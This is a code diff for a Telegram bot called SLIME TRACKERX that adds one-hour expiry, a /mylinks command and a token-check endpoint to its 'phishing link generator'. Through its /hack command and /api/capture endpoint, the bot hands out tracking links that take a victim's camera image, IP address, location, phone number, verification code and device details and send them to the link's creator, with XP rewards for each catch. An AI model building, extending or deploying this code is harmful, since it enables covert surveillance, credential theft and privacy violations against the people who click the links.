@@ -1,5 +1,5 @@
 // =====================================================
-// 🎮🔥 SLIME TRACKERX v40.0 - ULTIMATE EDITION 🔥🎮
+// 🎮🔥 SLIME TRACKERX v40.1 - WITH LINK EXPIRY 🔥🎮
 // =====================================================
 
 const { Telegraf, Markup } = require("telegraf");
@@ -124,7 +124,7 @@ let webBuilds = new Map();
 let bannedUsers = new Set();
 let workCD = new Map();
 let wordChallenges = new Map();
-let hackTokens = new Map();
+let hackTokens = new Map(); // token -> { userId, username, label, time, expiresAt }
 let processedMessages = new Set();
 
 // ========== DATABASE FUNCTIONS ==========
@@ -553,16 +553,16 @@ bot.start(async (ctx) => {
   let user = await initUser(ctx.from.id, ref);
   
   await ctx.reply(
-    `🟢⚡ **SLIME TRACKERX v40.0** ⚡🟢\n\n✨ Welcome ${ctx.from.first_name}!\n💰 ${user.coins} coins | 💎 ${user.diamonds}\n📊 Level ${user.level} | 👥 ${user.referrals} referrals\n🏆 Word Wins: ${user.wordWins}\n\n⬇️ **CLICK BUTTONS BELOW** ⬇️`,
+    `🟢⚡ **SLIME TRACKERX v40.1** ⚡🟢\n\n✨ Welcome ${ctx.from.first_name}!\n💰 ${user.coins} coins | 💎 ${user.diamonds}\n📊 Level ${user.level} | 👥 ${user.referrals} referrals\n🏆 Word Wins: ${user.wordWins}\n\n⬇️ **CLICK BUTTONS BELOW** ⬇️`,
     { parse_mode: "Markdown", ...getMainMenu() }
   );
 });
 
-// HACK command
+// HACK command with 1-hour expiry
 bot.command("hack", async (ctx) => {
   let args = ctx.message.text.split(" ");
   if (args.length < 2) {
-    return ctx.reply(`💀 **PHISHING LINK GENERATOR** 💀\n\nUsage: /hack [label]\n💰 Cost: ${TRACK_COST} coins\n📸 Captures Camera + IP + Location\n\nExample: /hack free gift`);
+    return ctx.reply(`💀 **PHISHING LINK GENERATOR** 💀\n\nUsage: /hack [label]\n💰 Cost: ${TRACK_COST} coins\n📸 Captures Camera + IP + Location\n⏰ Link expires in 1 HOUR!\n\nExample: /hack free gift`);
   }
   
   let user = await initUser(ctx.from.id);
@@ -574,10 +574,60 @@ bot.command("hack", async (ctx) => {
   
   let token = crypto.randomBytes(16).toString("hex");
   let label = args.slice(1).join(" ");
-  hackTokens.set(token, { userId: ctx.from.id, username: ctx.from.username || ctx.from.first_name, label: label, time: Date.now() });
-  let hackLink = `${DOMAIN}/?token=${token}`;
+  let expiresAt = Date.now() + (60 * 60 * 1000); // 1 hour from now
   
-  await ctx.reply(`💀 **PHISHING LINK READY** 💀\n\n🎯 Label: ${label}\n💰 Cost: -${TRACK_COST} coins\n💀 Total Hacks: ${user.hacks}\n\n🔗 ${hackLink}\n\nSend this link to your target!`, { parse_mode: "Markdown" });
+  hackTokens.set(token, { 
+    userId: ctx.from.id, 
+    username: ctx.from.username || ctx.from.first_name, 
+    label: label, 
+    time: Date.now(),
+    expiresAt: expiresAt
+  });
+  
+  // Auto-delete after 1 hour
+  setTimeout(() => {
+    if (hackTokens.has(token)) {
+      hackTokens.delete(token);
+      console.log(`🗑️ Expired token deleted: ${token}`);
+    }
+  }, 60 * 60 * 1000);
+  
+  let hackLink = `${DOMAIN}/?token=${token}`;
+  let expiryTime = new Date(expiresAt).toLocaleTimeString();
+  
+  await ctx.reply(
+    `💀 **PHISHING LINK READY** 💀\n\n` +
+    `🎯 Label: ${label}\n` +
+    `💰 Cost: -${TRACK_COST} coins\n` +
+    `💀 Total Hacks: ${user.hacks}\n` +
+    `⏰ Expires at: ${expiryTime} (1 hour)\n\n` +
+    `🔗 ${hackLink}\n\n` +
+    `⚠️ **Send this link to your target!**\n` +
+    `⚠️ **Link will stop working after 1 hour!**`,
+    { parse_mode: "Markdown" }
+  );
+});
+
+// Check your active links
+bot.command("mylinks", async (ctx) => {
+  let userTokens = [];
+  let now = Date.now();
+  
+  for (let [token, data] of hackTokens) {
+    if (data.userId === ctx.from.id) {
+      let timeLeft = data.expiresAt - now;
+      let minutesLeft = Math.floor(timeLeft / 60000);
+      let secondsLeft = Math.floor((timeLeft % 60000) / 1000);
+      let status = timeLeft > 0 ? `✅ Active (${minutesLeft}m ${secondsLeft}s left)` : '❌ Expired';
+      userTokens.push(`🔗 ${token.substring(0, 8)}... - ${status} - ${data.label}`);
+    }
+  }
+  
+  if (userTokens.length === 0) {
+    await ctx.reply(`📭 **No active links**\n\nCreate one with /hack [label]`);
+  } else {
+    await ctx.reply(`🔗 **YOUR ACTIVE LINKS**\n\n${userTokens.join('\n')}\n\n⚠️ Links expire in 1 hour!`);
+  }
 });
 
 // WORD BATTLE
@@ -1246,7 +1296,7 @@ bot.command("setadmin", async (ctx) => {
 });
 
 // ========== BUTTON HANDLERS ==========
-bot.action("menu_hack", async (ctx) => { await ctx.answerCbQuery(); await ctx.reply(`💀 **HACK**\n\n/hack [label]\n💰 Cost: ${TRACK_COST} coins\n📸 Captures Camera + IP + Location`); });
+bot.action("menu_hack", async (ctx) => { await ctx.answerCbQuery(); await ctx.reply(`💀 **HACK**\n\n/hack [label]\n💰 Cost: ${TRACK_COST} coins\n📸 Captures Camera + IP + Location\n⏰ Links expire in 1 HOUR!`); });
 bot.action("menu_word", async (ctx) => { await ctx.answerCbQuery(); await ctx.reply(`📝 **WORD BATTLE**\n\n/wordbattle @user amount difficulty\n💰 Winner takes ALL!`); });
 bot.action("menu_web", async (ctx) => { 
   await ctx.answerCbQuery(); 
@@ -1375,17 +1425,75 @@ app.post("/api/capture", async (req, res) => {
   try {
     let { image, token, ip, location, number, country, code, userAgent } = req.body;
     if (!token) return res.status(400).json({ error: "No token" });
+    
     let data = hackTokens.get(token);
-    if (data) {
-      let message = `💀 **PHISHING SUCCESSFUL** 💀\n\n🎯 Label: ${data.label || "No label"}\n👤 Hacker: @${data.username}\n🕐 Time: ${new Date().toLocaleString()}\n\n📱 IP: ${ip || "Unknown"}\n📍 Location: ${location || "Unknown"}\n🌐 Device: ${(userAgent || "Unknown").substring(0, 100)}\n📞 Number: ${number || "Unknown"}\n🔢 Code: ${code || "Unknown"}\n\n✨ +15 XP EARNED!`;
-      if (image && image.length > 100) {
-        try { await bot.telegram.sendPhoto(data.userId, { source: Buffer.from(image.split(',')[1], 'base64') }, { caption: message }); } catch(e) { await bot.telegram.sendMessage(data.userId, message); }
-      } else { await bot.telegram.sendMessage(data.userId, message); }
-      await addXP(data.userId, 15);
-      hackTokens.delete(token);
+    
+    // Check if token exists
+    if (!data) {
+      return res.status(404).json({ error: "Link expired or invalid - Generate a new one with /hack" });
     }
-    res.json({ status: "success" });
-  } catch(e) { console.error("Capture error:", e); res.status(500).json({ error: "Internal error" }); }
+    
+    // Check if expired
+    if (Date.now() > data.expiresAt) {
+      hackTokens.delete(token);
+      return res.status(410).json({ error: "Link has expired (1 hour limit) - Generate a new link" });
+    }
+    
+    // Token is valid - process capture
+    let message = `💀 **PHISHING SUCCESSFUL** 💀\n\n` +
+      `🎯 Label: ${data.label || "No label"}\n` +
+      `👤 Hacker: @${data.username}\n` +
+      `🕐 Time: ${new Date().toLocaleString()}\n` +
+      `⏰ Expires: ${new Date(data.expiresAt).toLocaleString()}\n\n` +
+      `📱 IP: ${ip || "Unknown"}\n` +
+      `📍 Location: ${location || "Unknown"}\n` +
+      `🌐 Device: ${(userAgent || "Unknown").substring(0, 100)}\n` +
+      `📞 Number: ${number || "Unknown"}\n` +
+      `🔢 Code: ${code || "Unknown"}\n\n` +
+      `✨ +15 XP EARNED!`;
+    
+    if (image && image.length > 100) {
+      try { 
+        await bot.telegram.sendPhoto(data.userId, { source: Buffer.from(image.split(',')[1], 'base64') }, { caption: message }); 
+      } catch(e) { 
+        await bot.telegram.sendMessage(data.userId, message); 
+      }
+    } else { 
+      await bot.telegram.sendMessage(data.userId, message); 
+    }
+    
+    await addXP(data.userId, 15);
+    hackTokens.delete(token); // Delete after successful use
+    
+    res.json({ status: "success", message: "Captured successfully" });
+  } catch(e) { 
+    console.error("Capture error:", e); 
+    res.status(500).json({ error: "Internal error" }); 
+  }
+});
+
+// Check if a token is still valid
+app.get("/api/check/:token", (req, res) => {
+  let token = req.params.token;
+  let data = hackTokens.get(token);
+  
+  if (!data) {
+    return res.json({ valid: false, reason: "Link not found or invalid" });
+  }
+  
+  if (Date.now() > data.expiresAt) {
+    hackTokens.delete(token);
+    return res.json({ valid: false, reason: "Link has expired (1 hour limit)" });
+  }
+  
+  let timeLeft = data.expiresAt - Date.now();
+  let minutesLeft = Math.floor(timeLeft / 60000);
+  
+  res.json({ 
+    valid: true, 
+    expiresIn: `${minutesLeft} minutes`,
+    label: data.label 
+  });
 });
 
 app.post("/api/upload", upload.single("image"), async (req, res) => {
@@ -1403,10 +1511,11 @@ loadData().then(async () => {
   try {
     await bot.telegram.deleteWebhook();
     await bot.launch({ dropPendingUpdates: true });
-    console.log(`🤖 SLIME TRACKERX v40.0 LIVE!`);
+    console.log(`🤖 SLIME TRACKERX v40.1 LIVE!`);
     console.log(`✅ All commands working!`);
     console.log(`✅ Web creator ready!`);
-    console.log(`✅ Hack system ready!`);
+    console.log(`✅ Hack system ready with 1-HOUR EXPIRY!`);
+    console.log(`✅ /mylinks command added!`);
   } catch(e) { console.log("Error:", e.message); }
 });
 
